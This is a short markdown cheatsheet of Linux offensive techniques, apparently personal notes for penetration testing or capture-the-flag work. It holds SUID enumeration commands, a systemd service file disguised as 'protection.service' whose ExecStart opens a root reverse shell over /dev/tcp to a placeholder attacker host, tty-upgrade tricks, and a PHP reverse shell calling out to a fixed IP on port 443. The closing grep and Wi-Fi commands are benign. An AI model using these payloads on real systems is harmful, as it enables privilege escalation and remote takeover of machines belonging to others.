# Linux Hacking Cheatsheet

## Find SUID bits
`find / -perm -u=s -type f 2>/dev/null`
`find / -user root -perm -4000 -exec ls -ldb {} \;`

## Priv Esc systemctl with user access
_Create protection.service file in writable directory_
```
[Unit]
Discription=Does very important stuff mmmkay

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1'

[Install]
WantedBy=multi-user.target
```

## Escaping no tty shell 
`/usr/bin/script -qc /bin/bash /dev/null`

_try ctrl + z_

`stty raw -echo`

`fg`

`export TERM=xterm #autocomplete`

## Find human readable strings in binary
`strings /usr/bin/menu`

## PHP reverse shell
```
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/172.30.10.210/443 0>&1'");
```

## Grep IPs out of file
`grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" file.txt`

## Search for keyword
`grep -ri "word" /`

## Edit Wifi Connections
`nmtui`

_or_

`nmcli`
